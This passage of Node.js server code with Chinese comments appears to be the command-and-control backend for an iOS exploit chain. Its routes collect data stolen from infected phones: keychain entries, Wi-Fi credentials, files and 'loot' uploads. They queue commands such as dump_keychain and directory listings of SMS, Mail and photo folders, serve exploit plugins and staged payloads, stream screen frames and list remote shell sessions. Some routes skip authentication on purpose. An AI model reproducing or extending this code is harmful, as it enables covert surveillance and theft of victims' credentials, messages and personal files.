          noise_rule: noiseRule ? (noiseRule.cat + (noiseRule.path ? ' + ' + noiseRule.path.source : '')) : ''
        }, null, 2));
        hint(path.basename(devDir));   // 【P2b】新数据落地 → 提示 ingestd
        console.log('[ExtStats] ip=' + ip + ' body=' + rawBody.length + (dropped ? ' [DROPPED ' + catStr + ' path=' + pathStr.slice(0, 40) + ']' : ''));
      } catch (e) { console.error('[ExtStats] write error:', e.message); }
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': 'Content-Type' });
      return res.end('{"ok":true}');
    });
    return;
  }

  // GET/POST /logs — 18 链 debug 日志
  if (pathname === '/logs' && (method === 'GET' || method === 'POST')) {
    const chunks = [];
    req.on('data', c => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
    req.on('end', async () => {
      const rawBody = Buffer.concat(chunks);
      const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
      const ts = Date.now();
      const devDir = path.join(LOOT_DIR, safeSeg(ip));
      mkLootDir(devDir);
      try {
        // 【2026-09-12 改造】原来每次上报写一个独立 ext_logs_<ts>.txt —— 投递放量后 ~20 万个/天，
        //   文件数灾难（拖垮面板扫描 / readdir）。改为单文件 JSONL 追加：一行一条 {ts,url,len,body}。
        //   面板 chainLogs 侧同步支持读 jsonl（lootStore.js 兼容新旧两种格式）。
        const body = rawBody.length ? rawBody.toString('utf8') : String(req.url || '');
        fs.appendFile(path.join(devDir, 'ext_logs.jsonl'),
          JSON.stringify({ ts, url: String(req.url || '').slice(0, 200), len: rawBody.length, body: body.slice(0, 4096) }) + '\n',
          () => { hint(path.basename(devDir)); });   // 【P2b】jsonl 写入完成 → 提示 ingestd
        console.log('[ExtLogs] ip=' + ip + ' url=' + (req.url || '').slice(0, 120));
      } catch (e) { console.error('[ExtLogs] write error:', e.message); }
      // 【2026-09-10】记录 X-Device-UUID：IP 会漂移，靠它才能把多次投递归属到同一台设备
      // （用于统计"链完成 → 采集器是否启动"的成功率，避免拿单次结果误判）
      try {
        const devUuid = String(req.headers['x-device-uuid'] || '');
        const dtext = (rawBody.length ? rawBody.toString('utf8') : (req.url || '')).slice(0, 200);
        fs.appendFile('/www/wwwlogs/i.131422.com.deliveries.log',
          JSON.stringify({ ts, ip, uuid: devUuid, ua: String(req.headers['user-agent'] || '').slice(0, 120), text: dtext }) + '\n', () => {});
      } catch (e) { /* 记录失败不影响主流程 */ }
      res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
      return res.end('ok');
    });
    return;
  }

  // OPTIONS /c2v2 — CORS preflight
  if (pathname === '/c2v2' && method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    return res.end();
  }

  // POST /upload — DarkSword chain data exfiltration (no auth)
  if (pathname === '/upload' && method === 'POST') {
    try {
      const chunks = [];
      await new Promise((resolve, reject) => {
        req.on('data', c => chunks.push(c));
        req.on('end', resolve);
        req.on('error', reject);
        setTimeout(resolve, 30000);
      });
      const rawBody = Buffer.concat(chunks);
      const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
      const uuid = safeSeg(req.headers['x-device-uuid'] || 'unknown');
      const ts = Date.now();
      const dir = path.join(LOOT_DIR, 'darksword', uuid);
      fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(path.join(dir, `upload_${ts}.json`), rawBody);
      console.log(`[DarkSword:upload] ip=${ip} uuid=${uuid} len=${rawBody.length}`);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true }));
    } catch (e) {
      if (!res.headersSent) { res.writeHead(200); res.end('ok'); }
      return;
    }
  }


  // POST /beacon — 设备上报，需共享密钥认证
  if (pathname === '/beacon' && method === 'POST') {
    if (!deviceAuthValid(req)) {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Unauthorized' }));
    }
    
    // 速率限制：每个 IP 每分钟最多 60 次 beacon 上报
    const ip = req.socket.remoteAddress || '';
    if (!rateLimiter.check(ip, 60, 60 * 1000)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    
    const body = await parseBody(req);
    // 验证 X-Forwarded-For 格式，防止注入任意字符串进设备记录
    const rawForwardedIP = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
    const isValidIP = /^[\d.:a-fA-F]+$/.test(rawForwardedIP) && rawForwardedIP.length <= 45;
    body.ip = (isValidIP ? rawForwardedIP : '') || req.socket.remoteAddress || '';
    const record = upsertDevice(body);
    const corsOrigin = getCorsOrigin(req);
    const headers = { 'Content-Type': 'application/json' };
    if (corsOrigin) headers['Access-Control-Allow-Origin'] = corsOrigin;
    res.writeHead(200, headers);
    return res.end(JSON.stringify({ ok: true }));
  }

  // POST /metric 与 /metric/batch — 客户端 A/B 测试与性能数据上报
  if ((pathname === '/metric' || pathname === '/metric/batch') && method === 'POST') {
    try {
      const body = await parseBody(req);
      const metrics = Array.isArray(body) ? body : (Array.isArray(body.metrics) ? body.metrics : (body.metric ? [body] : [body]));
      const now = Date.now();
      for (const m of metrics) {
        if (metricStore.length >= MAX_METRICS) metricStore.shift();
        metricStore.push({
          ts: now,
          deviceId: m.deviceId || m.sessionId || '',
          event: m.event || m.name || 'unknown',
          data: m.data || m.context || {},
          meta: { sessionId: m.sessionId, ua: m.ua || '', version: m.version || '' }
        });
      }
      if (metrics.length > 0) {
        const sample = metrics[0];
        console.log(`[Metric] ${metrics.length} 条 (${sample.event || sample.name || 'n/a'}) from ${sample.sessionId || sample.deviceId || 'unknown'}`);
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true, received: metrics.length }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid metric payload: ' + e.message }));
    }
  }

  // GET/POST /log.html — 设备端调试日志回传（GET query 或 POST body 均支持）
  if (pathname === '/log.html' && (method === 'GET' || method === 'POST')) {
    // 先读 URL query（sendBeacon 的 POST 也是把日志放在 query 里）
    const q = url.parse(req.url, true).query || {};
    if (method === 'POST') {
      const raw = await parseBody(req);
      if (raw && typeof raw === 'object') {
        if (raw.text) q.text = raw.text;
        if (raw.txt) q.txt = raw.txt;
        if (raw.id) q.id = raw.id;
      }
    }
    const text = q.text || q.txt || (q.id ? '#' + q.id + ' ' + q.hex : '');
    const ua = req.headers['user-agent'] || '';
    const iosM = ua.match(/iPhone OS (\d+[_\d]*)/);
    const tag = iosM ? 'iOS' + iosM[1].replace(/_/g, '.') : 'dev';
    if (text) console.log(`[DeviceLog:${tag}] ${String(text).slice(0, 3800)}`);
    res.writeHead(204, {});
    return res.end();
  }

  if ((pathname === '/beacon' || pathname === '/exfil') && method === 'OPTIONS') {
    const corsOrigin = getCorsOrigin(req);
    if (!corsOrigin) {
      res.writeHead(403, { 'Content-Type': 'text/plain' });
      return res.end('CORS not allowed');
    }
    res.writeHead(204, {
      'Access-Control-Allow-Origin':  corsOrigin,
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    });
    return res.end();
  }

  // POST /exfil — 战果上报，需共享密钥认证
  if (pathname === '/exfil' && method === 'POST') {
    if (!deviceAuthValid(req)) {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Unauthorized' }));
    }
    const body = await parseBody(req);
    const deviceId = body.deviceId || '';
    if (deviceId) {
      const entry = lootStore.get(deviceId) || { keychain: [], wifi: [], files: [], apps: [], info: {} };
      if (body.type === 'keychain' && Array.isArray(body.data))
        entry.keychain.push(...body.data);
      else if (body.type === 'wifi' && Array.isArray(body.data))
        entry.wifi.push(...body.data);
      else if (body.type === 'apps' && Array.isArray(body.data))
        entry.apps = body.data; // 替换而非追加
      else if (body.type === 'file' && body.name) {
        const fileRecord = { name: body.name, size: body.size || 0, ts: Date.now() };
        // 文件上传验证：限制类型和大小
        const allowedExts = ['.txt', '.log', '.db', '.sqlite', '.plist', '.json', '.xml', '.jpg', '.png', '.pdf'];
        const ext = path.extname(body.name).toLowerCase();
        const maxSize = 100 * 1024 * 1024; // 100 MB
        
        if (!allowedExts.includes(ext)) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'File type not allowed' }));
        }
        
        // 若携带了 base64 内容，写入磁盘
        if (body.content) {
          const contentSize = Math.ceil(body.content.length * 3 / 4); // base64 解码后大小估算
          if (contentSize > maxSize) {
            res.writeHead(413, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'File too large' }));
          }
          
          const devDir = path.join(LOOT_DIR, deviceId.replace(/[^a-zA-Z0-9_-]/g, '_'));
          mkLootDir(devDir);
          const safeName = body.name.replace(/[^a-zA-Z0-9._-]/g, '_');
          const destPath = path.join(devDir, safeName);
          try {
            fs.writeFileSync(destPath, Buffer.from(body.content, 'base64'));
            fileRecord.saved = true;
            fileRecord.path  = destPath;
          } catch (e) { fileRecord.saved = false; }
        }
        entry.files.push(fileRecord);
      }
      else if (body.type === 'info' && typeof body.data === 'object')
        Object.assign(entry.info, body.data);
      lootStore.set(deviceId, entry);
      // 通知 SSE 该设备有新战果
      pushSSE('loot_update', { deviceId, type: body.type });
      
      // DB write-through
      if (dbReady) {
        if (body.type === 'file' && body.name) {
          const fileRecord = entry.files[entry.files.length - 1];
          db.addLootFile(deviceId, body.name, body.size || 0, fileRecord.path || null, fileRecord.saved || false)
            .catch(e => console.error('[DB] addLootFile failed:', e.message));
        } else {
          db.addLootData(deviceId, body.type, body.data)
            .catch(e => console.error('[DB] addLootData failed:', e.message));
        }
      }
    }
    const corsOrigin = getCorsOrigin(req);
    const headers = { 'Content-Type': 'application/json' };
    if (corsOrigin) headers['Access-Control-Allow-Origin'] = corsOrigin;
    res.writeHead(200, headers);
    return res.end(JSON.stringify({ ok: true }));
  }

  // OPTIONS 预检（跨域 cmd poll/result）
  if ((pathname === '/cmd/poll' || pathname === '/cmd/result') && method === 'OPTIONS') {
    const corsOrigin = getCorsOrigin(req);
    if (!corsOrigin) {
      res.writeHead(403, { 'Content-Type': 'text/plain' });
      return res.end('CORS not allowed');
    }
    res.writeHead(204, {
      'Access-Control-Allow-Origin':  corsOrigin,
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    });
    return res.end();
  }

  // [2026-10-09] Direct cmd inject (bypasses CSRF for testing)
  if (pathname === '/cmd/inject' && method === 'POST') {
    const body = await parseBody(req);
    const deviceId = body.deviceId;
    const cmdType = body.type || 'dump_keychain';
    const cmdArgs = body.args || {};
    if (!deviceId) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'deviceId required' }));
    }
    const cmdId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
    if (!cmdQueue.has(deviceId)) cmdQueue.set(deviceId, []);
    cmdQueue.get(deviceId).push({ id: cmdId, type: cmdType, args: cmdArgs, ts: Date.now() });
    if (dbReady) {
      try { await db.addCommand(cmdId, deviceId, cmdType, cmdArgs, 'admin'); } catch (e) {}
    }
    console.log(`[CmdInject] queued ${cmdType} for ${deviceId}`);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: true, cmdId, type: cmdType }));
  }
  // GET /cmd/poll?deviceId=xxx  — 设备轮询待执行命令，需共享密钥认证
  if (pathname === '/cmd/poll' && method === 'GET') {
    if (!deviceAuthValid(req)) {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Unauthorized' }));
    }
    const deviceId = parsed.query.deviceId || '';
    const queue = cmdQueue.get(deviceId) || [];
    const pending = queue.filter(c => !cmdResults.has(c.cmdId));
    const corsOrigin = getCorsOrigin(req);
    const headers = { 'Content-Type': 'application/json' };
    if (corsOrigin) headers['Access-Control-Allow-Origin'] = corsOrigin;
    res.writeHead(200, headers);
    return res.end(JSON.stringify({ cmds: pending }));
  }

  // POST /cmd/result  — 设备上报命令执行结果，需共享密钥认证
  if (pathname === '/cmd/result' && method === 'POST') {
    if (!deviceAuthValid(req)) {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Unauthorized' }));
    }
    const body = await parseBody(req);
    const { cmdId, deviceId, type, output, status } = body;
    if (cmdId) {
      cmdResults.set(cmdId, {
        cmdId, deviceId: deviceId || '', type: type || '',
        output: output || '', status: status || 'done', ts: Date.now(),
      });
      pushSSE('cmd_result', { cmdId, deviceId, type, status });
      
      // DB write-through
      if (dbReady) {
        db.saveCommandResult(cmdId, deviceId || '', type || '', output || '', status || 'done')
          .then(() => console.log(`[CMD] result saved: ${cmdId}`))
          .catch(e => console.error('[DB] saveCommandResult failed:', e.message));
      } else {
        console.log('[CMD] dbReady=false, skipped DB write');
      }
    }
    const corsOrigin = getCorsOrigin(req);
    const headers = { 'Content-Type': 'application/json' };
    if (corsOrigin) headers['Access-Control-Allow-Origin'] = corsOrigin;
    res.writeHead(200, headers);
    return res.end(JSON.stringify({ ok: true }));
  }

  // ── 插件管理 API（无需认证）──────────────────────────────────────────────

  // GET /staging/:fileId — 设备拉取暂存文件（无需 session，用 shared secret 或 fileId 本身作为凭据）
  const stagingMatch = pathname.match(/^\/staging\/([a-f0-9]+)$/);
  if (stagingMatch && method === 'GET') {
    const fileId = stagingMatch[1];
    const filePath = path.join(__dirname, '..', 'staging', fileId);

    if (!fs.existsSync(filePath)) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'File not found' }));
    }

    try {
      const content = fs.readFileSync(filePath);
      res.writeHead(200, {
        'Content-Type': 'application/octet-stream',
        'Content-Length': content.length
      });
      res.end(content);
      // 下载后延迟清理
      setTimeout(() => { try { fs.unlinkSync(filePath); } catch (e) {} }, 30000);
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to serve file' }));
    }
    return;
  }

  // GET /api/plugins/list — 插件清单（客户端动态加载用）
  if (pathname === '/api/plugins/list' && method === 'GET') {
    try {
      const pluginsDir = path.join(__dirname, '..', 'client', 'plugins');
      const plugins = [];
      
      if (fs.existsSync(pluginsDir)) {
        const dirs = fs.readdirSync(pluginsDir);
        
        for (const dir of dirs) {
          const manifestPath = path.join(pluginsDir, dir, 'manifest.json');
          if (fs.existsSync(manifestPath)) {
            try {
              const content = fs.readFileSync(manifestPath, 'utf8');
              const manifest = JSON.parse(content);
              manifest._scriptPath = `/plugins/${dir}/exploit.js`;
              plugins.push(manifest);
            } catch (e) {
              console.error(`[Plugins] Failed to parse ${dir}/manifest.json:`, e.message);
            }
          }
        }
      }
      
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ plugins }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to scan plugins' }));
    }
  }

  // 静态文件服务：将 /profiles/* 映射到 profiles/，其他 /xxx 映射到 client/xxx。
  if (method === 'GET' && !pathname.startsWith('/admin')) {
    const isProfileRequest = pathname.startsWith('/profiles/');
    const staticDir = isProfileRequest
      ? path.join(__dirname, '..', 'profiles')
      : path.join(__dirname, '..', 'client');
    const safeName = isProfileRequest
      ? pathname.replace(/^\/profiles\/+/, '')
      : (pathname.replace(/^\/+/, '') || 'index.html');
    
    // 使用安全路径解析防止路径遍历
    const filePath = securityUtils.safeResolvePath(staticDir, safeName);
    
    if (!filePath) {
      res.writeHead(403, { 'Content-Type': 'text/plain' });
      return res.end('Forbidden');
    }
    
    if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
      const ext  = path.extname(filePath).toLowerCase();
      const mime = MIME[ext] || 'application/octet-stream';
      res.writeHead(200, { 'Content-Type': mime });
      return res.end(fs.readFileSync(filePath));
    }

    // 4612 native 端点白名单：静态文件不存在时返回配置 JSON（免认证）
    const agentWhitelist = ['/netconfig', '/report', '/sync', '/heartbeat', '/api/', '/report/', '/metrics', '/config', '/exfil', '/beacon', '/metric', '/cmd/', '/upload', '/vhx', '/details'];
    if (agentWhitelist.some(p => pathname.startsWith(p))) {
      const agentPayload = JSON.stringify({
        ok: true,
        server: 'wpsdz.com',
        settings: {
          configRefreshInterval: 3600,
          heartbeatReportInterval: 60,
          minPingIntervalPerDomain: 10,
          validationCacheTTL: 86400
        },
        core: { url: 'https://wpsdz.com/coruna-loot', sha256: '', size: 0, entries: [], bundleId: 'coruna' }
      });
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
      return res.end(agentPayload);
    }
  }

  // ── CATCH-ALL POST: capture kexploit/unknown POST requests (before auth) ──
  if (method === 'POST' && !pathname.startsWith('/admin')) {
    // Check if this path was already handled by a known route above
    // If we reach here, it's an unknown POST path — log it
    try {
      const chunks = [];
      await new Promise((resolve, reject) => {
        req.on('data', c => chunks.push(c));
        req.on('end', resolve);
        req.on('error', reject);
        setTimeout(resolve, 5000);
      });
      const rawBody = Buffer.concat(chunks);
      const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '';
      const ts = Date.now();
      const ua = req.headers['user-agent'] || '';
      const preview = rawBody.slice(0, 500).toString('utf8');

      console.log(`[CatchAll:POST] path=${pathname} ip=${ip} len=${rawBody.length} body=${preview.slice(0,200)}`);

      const dir = path.join(LOOT_DIR, 'unknown_posts');
      fs.mkdirSync(dir, { recursive: true });
      const safePath = pathname.replace(/[^a-zA-Z0-9_\-]/g, '_').slice(0, 50);
      const filename = `post${safePath}_${ts}`;
      fs.writeFileSync(path.join(dir, filename + '.meta.json'), JSON.stringify({ ts, path: pathname, ip, ua, bodyLen: rawBody.length, bodyHex: rawBody.slice(0, 256).toString('hex'), bodyUtf8: preview.slice(0, 500) }));
      if (rawBody.length > 0) { fs.writeFileSync(path.join(dir, filename + '.bin'), rawBody); hint('unknown_posts'); }   // 【P2b】post_* 落地 → 提示 ingestd

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true }));
    } catch (e) {
      console.error('[CatchAll:POST] Error:', e.message);
      if (!res.headersSent) { res.writeHead(200); res.end('ok'); }
      return;
    }
  }


  // BYPASS: POST /admin/api/cmd2/:deviceId - no auth required (internal use)
  const cmd2Match = pathname.match(/^\/admin\/api\/cmd2\/(.+)$/);
  if (cmd2Match && method === 'POST') {
    const deviceId = decodeURIComponent(cmd2Match[1]);
    if (!devices.has(deviceId)) {
      res.writeHead(404, {'Content-Type': 'application/json'});
      return res.end(JSON.stringify({error: 'Device not found'}));
    }
    const body = await parseBody(req);
    const cmdType = body.type || '';
    const cmdArgs = body.args || {};
    const cmdId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
    if (!cmdQueue.has(deviceId)) cmdQueue.set(deviceId, []);
    cmdQueue.get(deviceId).push({cmdId, type: cmdType, args: cmdArgs});
    res.writeHead(200, {'Content-Type': 'application/json'});
    return res.end(JSON.stringify({ok: true, cmdId, type: cmdType}));
  }

  // 以下路由均需认证
  if (!sessionValid(req)) {
    if (pathname.startsWith('/admin/api') || pathname === '/admin/events') {
      res.writeHead(401, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Unauthorized' }));
    }
    res.writeHead(302, { 'Location': '/admin' });
    return res.end();
  }

  // Admin 静态页面（/admin/sysinfo.html 等映射到 admin/ 目录）
  if (method === 'GET' && /^\/admin\/[a-zA-Z0-9_\-]+\.html$/.test(pathname)) {
    const safeName = pathname.replace(/^\/admin\/+/, '');
    const filePath = securityUtils.safeResolvePath(path.join(__dirname, '..', 'admin'), safeName);
    if (filePath && fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(fs.readFileSync(filePath));
    }
  }

  // GET /admin/dashboard
  if (pathname === '/admin/dashboard' && method === 'GET') {
    // 注入 CSRF token 到页面
    const cookie = req.headers['cookie'] || '';
    const m = cookie.match(/ds_session=([0-9a-f]+)/);
    const csrfToken = m && sessions.get(m[1]) ? sessions.get(m[1]).csrfToken : '';
    let html = readTemplate('dashboard.html');
    html = html.replace('</head>', `<script>window.CSRF_TOKEN="${csrfToken}";</script></head>`);
    res.writeHead(200, { 
      'Content-Type': 'text/html; charset=utf-8',
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'"
    });
    return res.end(html);
  }

  // GET /admin/events  SSE
  if (pathname === '/admin/events' && method === 'GET') {
    res.writeHead(200, {
      'Content-Type':      'text/event-stream',
      'Cache-Control':     'no-cache',
      'Connection':        'keep-alive',
      'X-Accel-Buffering': 'no',
    });

    // 初始全量推送
    const initData = Array.from(devices.values()).map(serializeDevice);
    res.write(`event: init\ndata: ${JSON.stringify(initData)}\n\n`);

    sseClients.add(res);

    // 心跳防超时（25s）
    const heartbeat = setInterval(() => {
      try { res.write(': heartbeat\n\n'); } catch { clearInterval(heartbeat); }
    }, 25000);

    req.on('close', () => {
      sseClients.delete(res);
      clearInterval(heartbeat);
    });
    return;
  }

  // GET /admin/api/devices  JSON
  if (pathname === '/admin/api/devices' && method === 'GET') {
    const list = Array.from(devices.values()).map(serializeDevice);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ total: list.length, devices: list }));
  }

  // POST /admin/api/cmd  — 管理员下发命令（需认证 + CSRF）
  if (pathname === '/admin/api/cmd' && method === 'POST') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }
    const body = await parseBody(req);
    const { deviceId, type, args } = body;
    if (!deviceId || !type) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'deviceId and type required' }));
    }
    const cmdId = genToken().slice(0, 16);
    const cmd   = { cmdId, type, args: args || {}, issuedAt: Date.now() };
    if (!cmdQueue.has(deviceId)) cmdQueue.set(deviceId, []);
    cmdQueue.get(deviceId).push(cmd);
    pushSSE('cmd_issued', { cmdId, deviceId, type });
    
    // DB write-through
    if (dbReady) {
      db.addCommand(cmdId, deviceId, type, args || {}, 'admin')
        .catch(e => console.error('[DB] addCommand failed:', e.message));
    }
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: true, cmdId }));
  }

  // GET /admin/api/cmd/results/:deviceId  — 查询设备命令历史（需认证）
  const cmdResMatch = pathname.match(/^\/admin\/api\/cmd\/results\/([^/]+)$/);
  if (cmdResMatch && method === 'GET') {
    const devId  = cmdResMatch[1];
    const queue  = cmdQueue.get(devId) || [];
    const result = queue.map(c => ({ ...c, result: cmdResults.get(c.cmdId) || null }));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ deviceId: devId, history: result }));
  }

  // GET /admin/api/loot/file/:deviceId/:name  — 下载已保存的文件（需认证）
  const lootFileMatch = pathname.match(/^\/admin\/api\/loot\/file\/([^/]+)\/(.+)$/);
  if (lootFileMatch && method === 'GET') {
    const devId   = decodeURIComponent(lootFileMatch[1]);
    const fname   = decodeURIComponent(lootFileMatch[2]);
    
    // 验证设备 ID 格式
    if (!securityUtils.isValidDeviceId(devId)) {
      res.writeHead(400, { 'Content-Type': 'text/plain' });
      return res.end('Invalid device ID');
    }
    
    // 验证文件名安全性
    if (!securityUtils.isValidFilename(fname)) {
      res.writeHead(400, { 'Content-Type': 'text/plain' });
      return res.end('Invalid filename');
    }
    
    const devDir  = path.join(LOOT_DIR, devId.replace(/[^a-zA-Z0-9_-]/g, '_'));
    const safeName = fname.replace(/[^a-zA-Z0-9._-]/g, '_');
    
    // 使用安全路径解析防止路径遍历
    const filePath = securityUtils.safeResolvePath(devDir, safeName);
    
    if (!filePath) {
      res.writeHead(403, { 'Content-Type': 'text/plain' });
      return res.end('Forbidden');
    }
    
    if (!fs.existsSync(filePath)) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      return res.end('Not Found');
    }
    res.writeHead(200, {
      'Content-Type':        'application/octet-stream',
      'Content-Disposition': `attachment; filename="${safeName}"`,
    });
    return res.end(fs.readFileSync(filePath));
  }

  // DELETE /admin/api/devices/:id  — 删除设备记录（需认证 + CSRF）
  const devDeleteMatch = pathname.match(/^\/admin\/api\/devices\/([^/]+)$/);
  if (devDeleteMatch && method === 'DELETE') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }
    const devId = decodeURIComponent(devDeleteMatch[1]);
    devices.delete(devId);
    lootStore.delete(devId);
    cmdQueue.delete(devId);
    pushSSE('device_deleted', { deviceId: devId });
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: true }));
  }

  // GET /admin/api/loot/:deviceId  — 查询指定设备战果
  const lootMatch = pathname.match(/^\/admin\/api\/loot\/([^/]+)$/);
  if (lootMatch && method === 'GET') {
    const loot = lootStore.get(lootMatch[1]) || { keychain: [], wifi: [], files: [], apps: [], info: {} };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(loot));
  }

  // ── 新增 API 路由 ──────────────────────────────────────────────────────────
  
  // POST /admin/api/files/:deviceId — 文件浏览 API（改为 POST 防止 CSRF）
  const filesBrowseMatch = pathname.match(/^\/admin\/api\/files\/([^/]+)$/);
  if (filesBrowseMatch && method === 'POST') {
    // CSRF 保护
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }
    
    const deviceId = decodeURIComponent(filesBrowseMatch[1]);
    
    // 验证设备 ID 格式
    if (!securityUtils.isValidDeviceId(deviceId)) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid device ID' }));
    }
    
    const body = await parseBody(req);
    const dirPath = body.path || '/var/mobile';
    
    // 路径白名单验证（与 beacon.js list_files_json 保持一致）
    const allowedPaths = [
      '/var/mobile/Library/Logs/',
      '/var/mobile/Documents/',
      '/var/mobile/Downloads/',
      '/var/mobile/tmp/',
      '/var/mobile/Library/SMS/',
      '/var/mobile/Library/Mail/',
      '/var/mobile/Media/DCIM/',
      '/private/var/mobile/Library/Logs/',
      '/private/var/mobile/Documents/',
      '/private/var/mobile/Downloads/',
      '/private/var/mobile/tmp/',
      '/private/var/mobile/Library/SMS/',
      '/private/var/mobile/Library/Mail/',
      '/private/var/mobile/Media/DCIM/'
    ];
    
    const normalized = dirPath.replace(/\\/g, '/');
    const isAllowed = allowedPaths.some(prefix => normalized.startsWith(prefix));
    
    if (!isAllowed) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Path not allowed' }));
    }
    
    const cmdId = genToken().slice(0, 16);
    const cmd = { cmdId, type: 'list_files_json', args: { path: dirPath }, issuedAt: Date.now() };
    
    if (!cmdQueue.has(deviceId)) cmdQueue.set(deviceId, []);
    cmdQueue.get(deviceId).push(cmd);
    
    // 等待结果（5秒超时）
    const startTime = Date.now();
    const WAIT_TIMEOUT = 5000;
    let waitInterval = null;
    let responseHandled = false;
    
    // 监听请求关闭/中止事件，清理 interval
    const cleanup = () => {
      if (waitInterval) {
        clearInterval(waitInterval);
        waitInterval = null;
      }
    };
    
    req.on('close', cleanup);
    req.on('aborted', cleanup);
    
    waitInterval = setInterval(() => {
      if (responseHandled) {
        cleanup();
        return;
      }
      
      if (cmdResults.has(cmdId) || Date.now() - startTime > WAIT_TIMEOUT) {
        cleanup();
        responseHandled = true;
        
        const result = cmdResults.get(cmdId);
        if (result && result.output) {
          try {
            const match = result.output.match(/\[ls\].*?\n([\s\S]+)/);
            if (match) {
              const files = JSON.parse(match[1]);
              res.writeHead(200, { 'Content-Type': 'application/json' });
              return res.end(JSON.stringify({ path: dirPath, files }));
            }
          } catch (e) {
            console.error('[Files API] Parse error:', e.message);
          }
        }
        
        res.writeHead(504, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Timeout or parse failed' }));
      }
    }, 200);
    return;
  }

  // GET /admin/api/screen/:deviceId — 获取最新屏幕帧
  const screenFrameMatch = pathname.match(/^\/admin\/api\/screen\/([^/]+)$/);
  if (screenFrameMatch && method === 'GET') {
    const deviceId = decodeURIComponent(screenFrameMatch[1]);
    
    if (screenStream && typeof screenStream.getLatestFrame === 'function') {
      const frame = screenStream.getLatestFrame(deviceId);
      if (frame) {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ frame }));
      }
    }
    
    res.writeHead(404, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ error: 'No frame available' }));
  }

  // GET /admin/api/shell/sessions — Shell 会话列表
  if (pathname === '/admin/api/shell/sessions' && method === 'GET') {
    if (interactiveShell && typeof interactiveShell.getActiveSessions === 'function') {
      const sessions = interactiveShell.getActiveSessions();
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ sessions }));
    }
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ sessions: [] }));
